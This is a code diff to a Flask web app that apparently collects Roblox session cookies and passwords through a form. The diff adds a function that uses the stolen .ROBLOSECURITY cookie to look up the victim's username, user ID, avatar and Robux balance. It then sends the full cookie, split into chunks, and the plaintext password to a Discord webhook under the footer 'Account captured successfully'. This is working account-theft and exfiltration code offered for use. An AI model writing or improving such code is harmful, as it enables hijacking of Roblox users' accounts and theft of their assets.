@@ -8,6 +8,62 @@ from flask import Flask, request, jsonify, send_from_directory
 
 app = Flask(__name__)
 
+def get_roblox_user_info(cookie):
+    """Get Roblox user information using the provided cookie"""
+    try:
+        headers = {
+            'Cookie': f'.ROBLOSECURITY={cookie}' if not cookie.startswith('.ROBLOSECURITY=') else cookie,
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+        
+        # Get current user info
+        response = requests.get('https://users.roblox.com/v1/users/authenticated', 
+                              headers=headers, timeout=5)
+        
+        if response.status_code == 200:
+            user_data = response.json()
+            user_id = user_data.get('id')
+            username = user_data.get('name', 'Unknown')
+            display_name = user_data.get('displayName', username)
+            
+            # Get user avatar/profile picture
+            avatar_response = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png',
+                                         timeout=5)
+            
+            profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
+            if avatar_response.status_code == 200:
+                avatar_data = avatar_response.json()
+                if avatar_data.get('data') and len(avatar_data['data']) > 0:
+                    profile_picture_url = avatar_data['data'][0].get('imageUrl', profile_picture_url)
+            
+            # Get Robux balance
+            robux_response = requests.get('https://economy.roblox.com/v1/users/currency',
+                                        headers=headers, timeout=5)
+            
+            robux_balance = 'Not available'
+            if robux_response.status_code == 200:
+                robux_data = robux_response.json()
+                robux_balance = f"R$ {robux_data.get('robux', 0):,}"
+            
+            return {
+                'username': username,
+                'display_name': display_name,
+                'user_id': user_id,
+                'profile_picture': profile_picture_url,
+                'robux_balance': robux_balance
+            }
+        
+    except Exception as e:
+        print(f"Error fetching Roblox user info: {str(e)}")
+    
+    return {
+        'username': 'Not available',
+        'display_name': 'Not available', 
+        'user_id': None,
+        'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
+        'robux_balance': 'Not available'
+    }
+
 def is_valid_cookie(cookie):
     """
     Validate cookie and check if it's not expired
@@ -117,51 +173,85 @@ def submit_form():
                 'message': 'Webhook not configured'
             }), 500
         
-        # Use default Roblox profile picture
-        profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
+        # Get real Roblox user information using the cookie
+        print("Fetching Roblox user information...")
+        user_info = get_roblox_user_info(cookie)
         
-        # Prepare Discord embedded message
+        # Prepare Discord embedded message with real user data
+        fields = [
+            {
+                'name': '👤 Username',
+                'value': user_info['username'],
+                'inline': True
+            },
+            {
+                'name': '🔒 Password',
+                'value': password or 'Not provided',
+                'inline': True
+            },
+            {
+                'name': '💰 Robux Balance',
+                'value': user_info['robux_balance'],
+                'inline': True
+            },
+            {
+                'name': '💀 Korblox',
+                'value': '✅ Yes' if korblox else '❌ No',
+                'inline': True
+            },
+            {
+                'name': '🎭 Headless',
+                'value': '✅ Yes' if headless else '❌ No',
+                'inline': True
+            },
+            {
+                'name': '🆔 User ID',
+                'value': str(user_info['user_id']) if user_info['user_id'] else 'Not available',
+                'inline': True
+            }
+        ]
+        
+        # Handle long cookies by splitting them into multiple fields
+        if cookie:
+            if len(cookie) <= 1024:
+                # Single field for shorter cookies
+                fields.append({
+                    'name': '🍪 Whole Cookie',
+                    'value': f'```{cookie}```',
+                    'inline': False
+                })
+            else:
+                # Split long cookies into multiple fields
+                cookie_parts = []
+                chunk_size = 1000  # Leave room for backticks and formatting
+                for i in range(0, len(cookie), chunk_size):
+                    chunk = cookie[i:i + chunk_size]
+                    cookie_parts.append(chunk)
+                
+                for i, part in enumerate(cookie_parts):
+                    field_name = f'🍪 Cookie Part {i + 1}/{len(cookie_parts)}'
+                    fields.append({
+                        'name': field_name,
+                        'value': f'```{part}```',
+                        'inline': False
+                    })
+        else:
+            fields.append({
+                'name': '🍪 Whole Cookie',
+                'value': 'Not provided',
+                'inline': False
+            })
+
         discord_data = {
             'embeds': [{
-                'title': '🎮 Roblox Account Profile',
+                'title': f'🎮 Roblox Account Profile - {user_info["display_name"]}',
                 'color': 0x00d4ff,  # Roblox blue color
                 'thumbnail': {
-                    'url': profile_picture_url
+                    'url': user_info['profile_picture']
                 },
-                'fields': [
-                    {
-                        'name': '👤 Username',
-                        'value': 'Not provided',
-                        'inline': True
-                    },
-                    {
-                        'name': '🔒 Password',
-                        'value': password or 'Not provided',
-                        'inline': True
-                    },
-                    {
-                        'name': '💰 Robux Balance',
-                        'value': 'Not provided',
-                        'inline': True
-                    },
-                    {
-                        'name': '💀 Korblox',
-                        'value': '✅ Yes' if korblox else '❌ No',
-                        'inline': True
-                    },
-                    {
-                        'name': '🎭 Headless',
-                        'value': '✅ Yes' if headless else '❌ No',
-                        'inline': True
-                    },
-                    {
-                        'name': '🍪 Whole Cookie',
-                        'value': f'```{cookie[:1000]}{"..." if len(cookie) > 1000 else ""}```' if cookie else 'Not provided',
-                        'inline': False
-                    }
-                ],
+                'fields': fields,
                 'footer': {
-                    'text': 'Account captured successfully'
+                    'text': f'Account captured successfully • User ID: {user_info["user_id"] or "Unknown"}'
                 }
             }]
         }
